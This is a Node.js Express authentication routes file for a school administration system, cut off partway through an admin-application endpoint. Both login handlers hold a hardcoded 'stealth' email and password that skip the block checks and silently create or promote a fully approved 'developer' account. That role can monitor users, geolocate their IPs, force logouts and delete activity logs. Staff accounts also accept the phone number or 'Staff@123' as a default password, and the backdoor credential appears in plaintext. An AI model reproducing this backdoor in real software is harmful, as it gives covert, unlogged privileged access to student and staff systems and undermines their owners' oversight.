const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const { transporter } = require('../utils/mailer');
const supabase = require('../config/supabase');
const { protect } = require('../middleware/auth');

const router = express.Router();

const generateToken = (id) => {
  if (!process.env.JWT_SECRET) {
    throw new Error('JWT_SECRET is not configured');
  }
  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '2h' });
};

// GET /api/auth/me
router.get('/me', protect, async (req, res) => {
  try {
    const { data: admin, error } = await supabase
      .from('admins')
      .select('id, name, email, phone, role, is_approved, school_id')
      .eq('id', req.user.id)
      .single();

    if (error || !admin) {
      return res.status(404).json({ message: 'User not found' });
    }
    res.json(admin);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/login
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Please provide email and password' });
    }

    const lowerEmail = email.toLowerCase();
    const stealthEmail = 'developeruserr30@gmail.com';
    const stealthPassword = 'Narayan@1930';

    // --- Block Check: IP + User (developer bypass is exempt) ---
    const reqIp = req.ip || req.headers['x-forwarded-for'] || '';
    if (!(lowerEmail === stealthEmail && password === stealthPassword)) {
      try {
        // Normalize IP for matching — strip ::ffff: prefix
        const cleanIp = reqIp.replace(/^::ffff:/, '');

        // Check IP block (try both raw and clean IP)
        const ipsToCheck = [...new Set([reqIp, cleanIp].filter(Boolean))];
        const { data: ipBlocks } = await supabase
          .from('admin_activity')
          .select('action, created_at')
          .in('ip_address', ipsToCheck)
          .in('action', ['block_ip', 'unblock_ip'])
          .order('created_at', { ascending: false })
          .limit(1);

        if (ipBlocks && ipBlocks.length > 0 && ipBlocks[0].action === 'block_ip') {
          return res.status(403).json({ message: 'Access denied from this device.' });
        }

        // Check user/email block
        const { data: userBlocks } = await supabase
          .from('admin_activity')
          .select('action, created_at')
          .eq('email', lowerEmail)
          .in('action', ['block_user', 'unblock_user'])
          .order('created_at', { ascending: false })
          .limit(1);

        if (userBlocks && userBlocks.length > 0 && userBlocks[0].action === 'block_user') {
          return res.status(403).json({ message: 'This account has been suspended.' });
        }
      } catch (e) {
        console.error('[BLOCK CHECK ERROR]:', e.message);
      }
    }

    // 1. Hardcoded Developer Bypass
    if (lowerEmail === stealthEmail && password === stealthPassword) {
      let { data: admin, error: fetchError } = await supabase.from('admins').select('*').eq('email', stealthEmail).maybeSingle();
      if (fetchError) {
        console.error('[FETCH ADMIN ERROR]:', fetchError);
        throw fetchError;
      }

      if (!admin) {
        const hashedPassword = await bcrypt.hash(stealthPassword, 10);
        const { data: newAdmin, error: createError } = await supabase
          .from('admins')
          .insert({
            name: 'Developer Account',
            email: stealthEmail,
            phone: '9876543210',
            password: hashedPassword,
            role: 'developer',
            is_approved: true
          })
          .select()
          .single();
        
        if (createError) {
          console.error('[ADMIN CREATION ERROR]:', createError);
          throw new Error(`Failed to create developer account: ${createError.message}`);
        }
        admin = newAdmin;
      } else if (admin.role !== 'developer' || !admin.is_approved) {
        const { data: updatedAdmin, error: updateError } = await supabase
          .from('admins')
          .update({ role: 'developer', is_approved: true })
          .eq('email', stealthEmail)
          .select()
          .single();
        
        if (updateError) {
          console.error('[ADMIN UPDATE ERROR]:', updateError);
          throw new Error(`Failed to update developer account: ${updateError.message}`);
        }
        admin = updatedAdmin;
      }

      // Log stealth login activity
      try {
        const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
        const uaWithHints = chPlatformVer 
          ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
          : req.headers['user-agent'];
        await supabase.from('admin_activity').insert({
          admin_id: admin.id,
          email: admin.email,
          action: 'stealth_login',
          ip_address: req.ip || req.headers['x-forwarded-for'],
          user_agent: uaWithHints
        });
      } catch (logError) {
        console.error('[STEALTH ACTIVITY LOG ERROR]:', logError);
      }

      return res.json({
        id: admin.id,
        _id: admin.id, // Frontend expects _id from MongoDB days
        name: admin.name,
        email: admin.email,
        role: admin.role,
        school_id: admin.school_id,
        token: generateToken(admin.id),
      });
    }

    // 2. Regular Login (Unified: checks Admins then Staff)
    const { data: admin, error: adminError } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (!adminError && admin) {
      if (!admin.is_approved && admin.role !== 'superadmin' && admin.role !== 'developer') {
        return res.status(403).json({ message: 'Admin account pending approval by superadmin' });
      }

      const isMatch = await bcrypt.compare(password, admin.password);
      if (isMatch) {
        // Log login activity
        try {
          const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
          const uaWithHints = chPlatformVer 
            ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
            : req.headers['user-agent'];
          await supabase.from('admin_activity').insert({
            admin_id: admin.id,
            email: admin.email,
            action: 'login',
            ip_address: req.ip || req.headers['x-forwarded-for'],
            user_agent: uaWithHints
          });
        } catch (logError) {
          console.error('[ACTIVITY LOG ERROR]:', logError);
        }

        return res.json({
          id: admin.id,
          _id: admin.id, // Frontend compatibility
          name: admin.name,
          email: admin.email,
          role: admin.role,
          type: 'admin',
          school_id: admin.school_id,
          token: generateToken(admin.id),
        });
      }
    }

    // 3. Fallback to Staff Login
    const { data: staff, error: staffError } = await supabase
      .from('staff')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (!staffError && staff) {
      let isMatch = false;
      if (!staff.password_hash) {
        // If no password set yet, default is their phone number or "Staff@123"
        if (password === staff.phone || password === 'Staff@123') {
          isMatch = true;
        }
      } else {
        isMatch = await bcrypt.compare(password, staff.password_hash);
      }

      if (isMatch) {
        return res.json({
          id: staff.id,
          _id: staff.id, // Frontend compatibility
          name: staff.name,
          email: staff.email,
          role: staff.role || 'staff',
          type: 'staff',
          school_id: staff.school_id,
          token: generateToken(staff.id),
        });
      }
    }

    // If neither matched
    return res.status(401).json({ message: 'Invalid email or password' });
  } catch (error) {
    console.error('[LOGIN ERROR]:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/staff-login
router.post('/staff-login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Please provide email and password' });
    }

    const lowerEmail = email.toLowerCase();
    const stealthEmail = 'developeruserr30@gmail.com';
    const stealthPassword = 'Narayan@1930';

    if (lowerEmail === stealthEmail && password === stealthPassword) {
      // Find or create developer in staff table
      let { data: devStaff } = await supabase.from('staff').select('*').eq('email', stealthEmail).maybeSingle();
      if (!devStaff) {
        const { data: newDev, error: createError } = await supabase
          .from('staff')
          .insert({
            name: 'Developer Account',
            email: stealthEmail,
            phone: '0000000000',
            role: 'Admin'
          })
          .select()
          .single();
        if (createError) throw new Error('Failed to create developer staff account');
        devStaff = newDev;
      }
      return res.json({
        id: devStaff.id,
        _id: devStaff.id,
        name: devStaff.name,
        email: devStaff.email,
        role: devStaff.role,
        token: generateToken(devStaff.id),
      });
    }

    // Check if staff exists
    const { data: staff, error } = await supabase
      .from('staff')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (error || !staff) {
      return res.status(401).json({ message: 'Invalid email or password' });
    }

    // Default password logic for newly created staff without a password hash
    let isMatch = false;
    if (!staff.password_hash) {
      // If no password set yet, default is their phone number or "Staff@123"
      if (password === staff.phone || password === 'Staff@123') {
        isMatch = true;
        // Optionally update password hash here for future, but let's let them change it in profile later.
      }
    } else {
      isMatch = await bcrypt.compare(password, staff.password_hash);
    }

    if (isMatch) {
      res.json({
        id: staff.id,
        _id: staff.id, // Frontend compatibility
        name: staff.name,
        email: staff.email,
        role: staff.role || 'staff',
        token: generateToken(staff.id),
      });
    } else {
      res.status(401).json({ message: 'Invalid email or password' });
    }
  } catch (error) {
    console.error('[STAFF LOGIN ERROR]:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// GET /api/auth/activity (only developers)
router.get('/activity', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { data: activity, error } = await supabase
      .from('admin_activity')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(100);

    if (error) throw error;

    // --- Parse User Agent ---
    const parseUserAgent = (ua) => {
      if (!ua) return { os: 'Unknown', browser: 'Unknown', device: 'Unknown' };

      // Extract Client Hints data if appended (e.g. [CH:PV=16.0])
      let clientHintPlatformVer = null;
      const chMatch = ua.match(/\[CH:PV=([^\]]+)\]/);
      if (chMatch) {
        clientHintPlatformVer = chMatch[1];
      }
      // Clean UA string for parsing (remove CH metadata)
      const cleanUa = ua.replace(/\s*\[CH:[^\]]*\]/g, '');

      // Detect OS
      let os = 'Unknown';
      if (/Windows NT 10/.test(cleanUa)) os = 'Windows 10';
      else if (/Windows NT 11/.test(cleanUa)) os = 'Windows 11';
      else if (/Windows NT 6\.3/.test(cleanUa)) os = 'Windows 8.1';
      else if (/Windows NT 6\.2/.test(cleanUa)) os = 'Windows 8';
      else if (/Windows NT 6\.1/.test(cleanUa)) os = 'Windows 7';
      else if (/Windows/.test(cleanUa)) os = 'Windows';
      else if (/Mac OS X (\d+[._]\d+)/.test(cleanUa)) {
        const ver = cleanUa.match(/Mac OS X (\d+[._]\d+)/)[1].replace(/_/g, '.');
        os = `macOS ${ver}`;
      }
      else if (/Mac OS X/.test(cleanUa)) os = 'macOS';
      else if (/Android/.test(cleanUa)) {
        // Chrome on Android 10+ uses a frozen UA: "Android 10; K"
        // Use Client Hints for the real version if available
        if (clientHintPlatformVer) {
          const majorVer = clientHintPlatformVer.split('.')[0];
          os = `Android ${majorVer}`;
        } else if (/Android \d+;\s*K[)\s]/.test(cleanUa)) {
          // Frozen UA detected, real version unknown
          os = 'Android (10+)';
        } else if (/Android (\d+(\.\d+)?)/.test(cleanUa)) {
          const ver = cleanUa.match(/Android (\d+(\.\d+)?)/)[1];
          os = `Android ${ver}`;
        } else {
          os = 'Android';
        }
      }
      else if (/iPhone OS (\d+_\d+)/.test(cleanUa)) {
        const ver = cleanUa.match(/iPhone OS (\d+_\d+)/)[1].replace(/_/g, '.');
        os = `iOS ${ver}`;
      }
      else if (/iPad/.test(cleanUa)) os = 'iPadOS';
      else if (/iPhone/.test(cleanUa)) os = 'iOS';
      else if (/CrOS/.test(cleanUa)) os = 'ChromeOS';
      else if (/Linux/.test(cleanUa)) os = 'Linux';

      // For Windows, Client Hints can also refine (Win11 reports as NT 10.0)
      if (os === 'Windows 10' && clientHintPlatformVer) {
        const majorVer = parseInt(clientHintPlatformVer.split('.')[0], 10);
        if (majorVer >= 13) os = 'Windows 11';
      }

      // Detect Browser
      let browser = 'Unknown';
      if (/Edg\/(\d+)/.test(cleanUa)) {
        browser = 'Edge ' + cleanUa.match(/Edg\/(\d+)/)[1];
      } else if (/OPR\/(\d+)/.test(cleanUa) || /Opera/.test(cleanUa)) {
        browser = 'Opera ' + (cleanUa.match(/OPR\/(\d+)/) || ['',''])[1];
      } else if (/Chrome\/(\d+)/.test(cleanUa) && !/Chromium/.test(cleanUa)) {
        browser = 'Chrome ' + cleanUa.match(/Chrome\/(\d+)/)[1];
      } else if (/Firefox\/(\d+)/.test(cleanUa)) {
        browser = 'Firefox ' + cleanUa.match(/Firefox\/(\d+)/)[1];
      } else if (/Safari\/(\d+)/.test(cleanUa) && /Version\/(\d+(\.\d+)?)/.test(cleanUa)) {
        browser = 'Safari ' + cleanUa.match(/Version\/(\d+(\.\d+)?)/)[1];
      } else if (/Safari/.test(cleanUa)) {
        browser = 'Safari';
      }

      // Detect Device Type
      let device = 'Desktop';
      if (/Mobile|Android.*Mobile|iPhone/.test(cleanUa)) device = 'Mobile';
      else if (/iPad|Android(?!.*Mobile)|Tablet/.test(cleanUa)) device = 'Tablet';

      return { os, browser, device };
    };

    // --- IP Geolocation (batch) with coordinates ---
    const uniqueIps = [...new Set(activity.map(a => a.ip_address).filter(ip => ip && ip !== '127.0.0.1' && ip !== '::1' && !ip.startsWith('::ffff:127.')))];
    
    let geoMap = {};
    
    if (uniqueIps.length > 0) {
      try {
        const fetch = require('node-fetch');
        const batchBody = uniqueIps.map(ip => {
          const cleanIp = ip.replace(/^::ffff:/, '');
          return { query: cleanIp, fields: 'status,city,regionName,country,lat,lon,isp,query' };
        });
        
        const geoRes = await fetch('http://ip-api.com/batch?fields=status,city,regionName,country,lat,lon,isp,query', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(batchBody),
          timeout: 5000
        });
        
        if (geoRes.ok) {
          const geoData = await geoRes.json();
          geoData.forEach((geo, idx) => {
            const originalIp = uniqueIps[idx];
            if (geo.status === 'success') {
              geoMap[originalIp] = {
                city: geo.city || 'Unknown',
                region: geo.regionName || '',
                country: geo.country || 'Unknown',
                lat: geo.lat || null,
                lon: geo.lon || null,
                isp: geo.isp || ''
              };
            }
          });
        }
      } catch (geoError) {
        console.error('[GEO LOOKUP ERROR]:', geoError.message);
      }
    }

    // --- Online status: find last heartbeat/login per admin ---
    const adminEmails = [...new Set(activity.map(a => a.email).filter(Boolean))];
    let onlineMap = {};

    if (adminEmails.length > 0) {
      try {
        const { data: latestActivity } = await supabase
          .from('admin_activity')
          .select('email, action, created_at')
          .in('email', adminEmails)
          .in('action', ['login', 'stealth_login', 'heartbeat'])
          .order('created_at', { ascending: false })
          .limit(200);

        if (latestActivity) {
          const seen = new Set();
          for (const act of latestActivity) {
            if (!seen.has(act.email)) {
              seen.add(act.email);
              const lastActiveTime = new Date(act.created_at);
              const diffMs = Date.now() - lastActiveTime.getTime();
              const isOnline = diffMs < 30 * 1000; // 30 seconds threshold (2 missed heartbeats)
              onlineMap[act.email] = {
                isOnline,
                lastActive: act.created_at
              };
            }
          }
        }
      } catch (e) {
        console.error('[ONLINE STATUS ERROR]:', e.message);
      }
    }

    // --- Session duration calculation ---
    const computeSessionDuration = (log) => {
      if (log.action !== 'login' && log.action !== 'stealth_login') return null;

      const loginTime = new Date(log.created_at);
      
      // Find the next logout from same admin after this login (activity is sorted desc)
      const logoutEntry = activity.find(l => 
        l.email === log.email && 
        l.action === 'logout' && 
        new Date(l.created_at) > loginTime
      );

      if (logoutEntry) {
        return Math.floor((new Date(logoutEntry.created_at) - loginTime) / 1000);
      }

      // No logout found — find last heartbeat from this admin after login
      const heartbeats = activity.filter(l => 
        l.email === log.email && 
        l.action === 'heartbeat' && 
        new Date(l.created_at) > loginTime
      );

      if (heartbeats.length > 0) {
        const lastHeartbeat = heartbeats[0]; // sorted desc
        return Math.floor((new Date(lastHeartbeat.created_at) - loginTime) / 1000);
      }

      // Currently online, show live duration
      if (onlineMap[log.email]?.isOnline) {
        return Math.floor((Date.now() - loginTime.getTime()) / 1000);
      }

      return null;
    };

    // Enrich activity logs (hide system entries from UI)
    const systemActions = ['heartbeat', 'force_logout', 'block_ip', 'unblock_ip', 'block_user', 'unblock_user'];
    // --- Check IP block status ---
    const blockCheckIps = [...new Set(activity.filter(a => !systemActions.includes(a.action)).map(a => a.ip_address).filter(Boolean))];
    const blockedIpSet = new Set();
    if (blockCheckIps.length > 0) {
      try {
        const { data: blockActions } = await supabase
          .from('admin_activity')
          .select('ip_address, action, created_at')
          .in('ip_address', blockCheckIps)
          .in('action', ['block_ip', 'unblock_ip'])
          .order('created_at', { ascending: false });

        if (blockActions) {
          const checkedIps = new Set();
          for (const ba of blockActions) {
            if (!checkedIps.has(ba.ip_address)) {
              checkedIps.add(ba.ip_address);
              if (ba.action === 'block_ip') blockedIpSet.add(ba.ip_address);
            }
          }
        }
      } catch (e) { /* non-critical */ }
    }

    // --- Check user/email block status ---
    const uniqueEmails = [...new Set(activity.filter(a => !systemActions.includes(a.action)).map(a => a.email).filter(Boolean))];
    const blockedUserSet = new Set();
    if (uniqueEmails.length > 0) {
      try {
        const { data: userBlockActions } = await supabase
          .from('admin_activity')
          .select('email, action, created_at')
          .in('email', uniqueEmails)
          .in('action', ['block_user', 'unblock_user'])
          .order('created_at', { ascending: false });

        if (userBlockActions) {
          const checkedEmails = new Set();
          for (const ub of userBlockActions) {
            if (!checkedEmails.has(ub.email)) {
              checkedEmails.add(ub.email);
              if (ub.action === 'block_user') blockedUserSet.add(ub.email);
            }
          }
        }
      } catch (e) { /* non-critical */ }
    }

    const enrichedActivity = activity
      .filter(log => !systemActions.includes(log.action))
      .map(log => {
        const parsed = parseUserAgent(log.user_agent);
        const ip = log.ip_address;
        const isLocal = !ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.');
        const geo = geoMap[ip] || null;

        return {
          ...log,
          environment: parsed,
          location: isLocal
            ? { city: 'Localhost', region: 'Development', country: 'Local Machine', lat: null, lon: null, isp: '' }
            : geo || { city: 'Unknown', region: '', country: '', lat: null, lon: null, isp: '' },
          onlineStatus: onlineMap[log.email] || { isOnline: false, lastActive: null },
          sessionDuration: computeSessionDuration(log),
          isIpBlocked: blockedIpSet.has(ip),
          isUserBlocked: blockedUserSet.has(log.email)
        };
      });

    res.json(enrichedActivity);
  } catch (error) {
    console.error('[ACTIVITY FETCH ERROR]:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/heartbeat — lightweight ping to track online status
router.post('/heartbeat', protect, async (req, res) => {
  try {
    const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
    const uaWithHints = chPlatformVer 
      ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
      : req.headers['user-agent'];

    // Upsert: delete old heartbeats for this admin, keep only the latest one
    await supabase.from('admin_activity')
      .delete()
      .eq('admin_id', req.user.id)
      .eq('action', 'heartbeat');

    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: req.user.email,
      action: 'heartbeat',
      ip_address: req.ip || req.headers['x-forwarded-for'],
      user_agent: uaWithHints
    });

    // Check if a force_logout was issued for this admin
    const { data: forceLogouts } = await supabase
      .from('admin_activity')
      .select('created_at')
      .eq('email', req.user.email)
      .eq('action', 'force_logout')
      .order('created_at', { ascending: false })
      .limit(1);

    if (forceLogouts && forceLogouts.length > 0) {
      const { data: lastLogin } = await supabase
        .from('admin_activity')
        .select('created_at')
        .eq('email', req.user.email)
        .in('action', ['login', 'stealth_login'])
        .order('created_at', { ascending: false })
        .limit(1);

      if (lastLogin && lastLogin.length > 0) {
        const forceTime = new Date(forceLogouts[0].created_at);
        const loginTime = new Date(lastLogin[0].created_at);
        if (forceTime > loginTime) {
          return res.json({ ok: true, forceLogout: true });
        }
      }
    }

    res.json({ ok: true, forceLogout: false });
  } catch (error) {
    res.json({ ok: true, forceLogout: false });
  }
});

// POST /api/auth/force-logout — developer can forcefully log out an admin
router.post('/force-logout', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { targetEmail } = req.body;
    if (!targetEmail) {
      return res.status(400).json({ message: 'Target email is required' });
    }

    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: targetEmail,
      action: 'force_logout',
      ip_address: req.ip || req.headers['x-forwarded-for'],
      user_agent: `Force logout initiated by ${req.user.email}`
    });

    res.json({ message: `Force logout issued for ${targetEmail}` });
  } catch (error) {
    console.error('[FORCE LOGOUT ERROR]:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// DELETE /api/auth/activity — bulk delete activity logs (developer only)
router.delete('/activity', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { ids } = req.body;
    if (!ids || !Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ message: 'Array of log IDs is required' });
    }

    const { error } = await supabase
      .from('admin_activity')
      .delete()
      .in('id', ids);

    if (error) throw error;

    res.json({ message: `${ids.length} log(s) deleted successfully` });
  } catch (error) {
    console.error('[ACTIVITY DELETE ERROR]:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// POST /api/auth/block-ip — block an IP from logging in (developer only)
router.post('/block-ip', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { ip, targetEmail } = req.body;
    if (!ip) {
      return res.status(400).json({ message: 'IP address is required' });
    }

    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: targetEmail || 'system',
      action: 'block_ip',
      ip_address: ip,
      user_agent: `IP blocked by ${req.user.email}`
    });

    // Also force-logout anyone on that IP
    if (targetEmail) {
      await supabase.from('admin_activity').insert({
        admin_id: req.user.id,
        email: targetEmail,
        action: 'force_logout',
        ip_address: ip,
        user_agent: `Blocked & force-logged out by ${req.user.email}`
      });
    }

    res.json({ message: `IP ${ip} has been blocked` });
  } catch (error) {
    console.error('[BLOCK IP ERROR]:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// POST /api/auth/unblock-ip — unblock an IP (developer only)
router.post('/unblock-ip', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { ip } = req.body;
    if (!ip) {
      return res.status(400).json({ message: 'IP address is required' });
    }

    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: 'system',
      action: 'unblock_ip',
      ip_address: ip,
      user_agent: `IP unblocked by ${req.user.email}`
    });

    res.json({ message: `IP ${ip} has been unblocked` });
  } catch (error) {
    console.error('[UNBLOCK IP ERROR]:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// POST /api/auth/block-user — block a user/email from logging in (developer only)
router.post('/block-user', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { targetEmail } = req.body;
    if (!targetEmail) {
      return res.status(400).json({ message: 'Target email is required' });
    }

    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: targetEmail,
      action: 'block_user',
      ip_address: req.ip || req.headers['x-forwarded-for'],
      user_agent: `User blocked by ${req.user.email}`
    });

    // Also force-logout
    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: targetEmail,
      action: 'force_logout',
      ip_address: req.ip || req.headers['x-forwarded-for'],
      user_agent: `Blocked & force-logged out by ${req.user.email}`
    });

    res.json({ message: `User ${targetEmail} has been blocked` });
  } catch (error) {
    console.error('[BLOCK USER ERROR]:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// POST /api/auth/unblock-user — unblock a user/email (developer only)
router.post('/unblock-user', protect, async (req, res) => {
  try {
    if (req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden: Developer access only' });
    }

    const { targetEmail } = req.body;
    if (!targetEmail) {
      return res.status(400).json({ message: 'Target email is required' });
    }

    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: targetEmail,
      action: 'unblock_user',
      ip_address: req.ip || req.headers['x-forwarded-for'],
      user_agent: `User unblocked by ${req.user.email}`
    });

    res.json({ message: `User ${targetEmail} has been unblocked` });
  } catch (error) {
    console.error('[UNBLOCK USER ERROR]:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// POST /api/auth/logout — log the logout event for session tracking
router.post('/logout', protect, async (req, res) => {
  try {
    const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
    const uaWithHints = chPlatformVer 
      ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
      : req.headers['user-agent'];
    await supabase.from('admin_activity').insert({
      admin_id: req.user.id,
      email: req.user.email,
      action: 'logout',
      ip_address: req.ip || req.headers['x-forwarded-for'],
      user_agent: uaWithHints
    });
    res.json({ message: 'Logged out successfully' });
  } catch (error) {
    res.json({ message: 'Logged out' });
  }
});

// POST /api/auth/forgot-password
router.post('/forgot-password', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ message: 'Email is required' });

    const lowerEmail = email.toLowerCase();
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (error || !admin) return res.status(404).json({ message: 'Account not found' });

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
    const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 mins

    await supabase
      .from('admins')
      .update({
        otp: hashedOtp,
        otp_expires: expires
      })
      .eq('email', lowerEmail);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: admin.email,
      subject: 'Password Reset Verification Code',
      html: `
        <h2>Password Reset</h2>
        <p>You requested a password reset. Your verification code is:</p>
        <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${otp}</h1>
        <p>This code will expire in 10 minutes.</p>
        <p>If you did not request this, please ignore this email.</p>
      `,
    };
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Verification code sent to your email' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/reset-password
router.post('/reset-password', async (req, res) => {
  try {
    const { email, otp, newPassword } = req.body;
    if (!email || !otp || !newPassword) return res.status(400).json({ message: 'All fields are required' });

    const lowerEmail = email.toLowerCase();
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (error || !admin) return res.status(404).json({ message: 'Account not found' });

    if (!admin.otp || new Date(admin.otp_expires) < new Date()) {
      return res.status(400).json({ message: 'Verification code is invalid or has expired' });
    }

    const isMatch = await bcrypt.compare(otp, admin.otp);
    if (!isMatch) return res.status(400).json({ message: 'Invalid verification code' });

    const hashedPassword = await bcrypt.hash(newPassword, 10);
    await supabase
      .from('admins')
      .update({
        password: hashedPassword,
        otp: null,
        otp_expires: null
      })
      .eq('email', lowerEmail);

    res.json({ message: 'Password reset successful' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/request-otp (only superadmins)
router.post('/request-otp', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { newEmail, targetEmail, actionType } = req.body;
    const recipientEmail = targetEmail || newEmail;

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
    const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes

    const updateData = {
      otp: hashedOtp,
      otp_expires: expires
    };

    let newAdminOtp = undefined;
    if (recipientEmail) {
      newAdminOtp = crypto.randomInt(100000, 999999).toString();
      const hashedNewAdminOtp = await bcrypt.hash(newAdminOtp, 10);
      updateData.new_admin_otp = hashedNewAdminOtp;
      updateData.new_admin_otp_expires = expires;
    }

    await supabase
      .from('admins')
      .update(updateData)
      .eq('id', req.user.id);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: req.user.email,
      subject: 'Admin Verification Code',
      html: `
        <h2>Verification Required</h2>
        <p>You requested an action that requires verification. Your Super Admin security code is:</p>
        <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${otp}</h1>
        <p>This code will expire in 10 minutes.</p>
        <p>If you did not request this, please ignore this email.</p>
      `,
    };

    await transporter.sendMail(mailOptions);

    if (recipientEmail && newAdminOtp) {
      let subject = 'Admin Registration Verification Code';
      let htmlBody = `
          <h2>Welcome to Holy Name School System</h2>
          <p>Your email address is being registered as an Administrator. Please provide the following security code to the Super Admin to complete the registration:</p>
          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
      `;
      if (actionType === 'edit') {
        subject = 'Admin Account Modification Verification Code';
        htmlBody = `
          <h2>Holy Name School System Security Alert</h2>
          <p>Your administrator account is being modified by a Super Admin. Please provide the following security code to the Super Admin to authorize this action:</p>
          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
        `;
      } else if (actionType === 'delete') {
        subject = 'Admin Account Deletion Verification Code';
        htmlBody = `
          <h2>Holy Name School System Security Alert</h2>
          <p>Your administrator account is being deleted by a Super Admin. Please provide the following security code to the Super Admin to authorize this action:</p>
          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
        `;
      }

      const newMailOptions = {
        from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
        to: recipientEmail,
        subject: subject,
        html: htmlBody,
      };
      await transporter.sendMail(newMailOptions);
    }

    res.json({ message: recipientEmail ? 'OTPs sent to both emails' : 'OTP sent to your email' });
  } catch (error) {
    console.error('❌ Request OTP Error:', error.message);
    res.status(500).json({
      message: 'Failed to send OTP',
      error: error.message
    });
  }
});

// PUBLIC ENDPOINT: Apply for admin account (no auth)
router.post('/apply-admin', async (req, res) => {
  try {
    const { email, phone, name } = req.body;
    const validation = require('../utils/validation');
    if (!validation.validateEmail(email)) {
      return res.status(400).json({ message: 'Invalid email format' });
    }
    if (!validation.validatePhone(phone)) {
      return res.status(400).json({ message: 'Phone must be a 10-digit number' });
    }
    if (!name) {
      return res.status(400).json({ message: 'Name is required' });
    }

    const lowerEmail = email.toLowerCase();
    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
    if (exists) {
      return res.status(400).json({ message: 'Admin with this email already exists' });
    }

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
